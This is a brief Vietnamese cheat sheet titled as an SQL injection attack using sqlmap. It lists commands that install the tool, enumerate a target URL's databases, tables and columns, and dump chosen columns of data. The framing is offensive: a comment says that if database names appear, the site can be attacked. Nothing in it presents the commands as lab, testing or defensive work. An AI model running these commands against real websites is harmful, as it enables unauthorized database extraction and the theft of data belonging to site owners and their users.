# Tấn công SQL INJECTION bằng tool [sqlmap](http://sqlmap.org/)

```shell
# cài đặt sqlmap
$ sudo apt-get update
$ sudo apt-get install sqlmap

# kiểm tra trang web có bị lỗ hổng sql không, nếu thực hiện lệnh sau mà đưa ra các tên database thì trang web này có thể bị tấn công sql injection
# show databases
$ sqlmap -u {{url}} --dbs

# show tables
$ sqlmap -u {{url}} -D {{db_name}} --table

# show columnd
$ sqlmap -u {{url}} -D {{db_name}} -T {{table_name}} --column

# clone data
$ sqlmap -u {{url}} -D {{db_name}} -T {{table_name}} --C col1,col2,col3 --dump
```